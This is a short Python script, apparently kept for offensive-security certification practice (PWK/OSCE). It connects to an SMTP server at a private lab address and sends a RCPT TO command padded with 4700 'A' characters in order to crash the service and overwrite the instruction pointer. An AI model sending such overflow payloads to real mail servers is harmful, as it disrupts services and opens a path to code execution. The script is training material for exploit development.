#!/usr/bin/python
#
# This is the script from PWK, Chapter 6
# I am repurposing it for OSCE fuzzing practice and eip overwrite
# 
#
import socket

# Unique buffer string
buffer="A"*4700
#while len(buffer) <=40:
#	buffer.append("X"*counter)
#	counter=counter+200

#for string in buffer:
print "Fuzzing RCPTTO unique string boo" 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect (('192.168.1.66', 25))	# Connect to IP & SMTP port
s.recv(1024)				# recieve banner
s.send('EHLO root@localhost + \r\n')		# send EHLO
s.recv(1024)			# recieve reply
s.send('MAIL FROM: nobody@nobody + \r\n') # Send the phony Mail From
s.recv(1024)
s.send('RCPT TO:' + buffer + '\r\n')	# unique evil string
#s.send('QUIT\r\n')
s.close()


#s.close()				# close socket


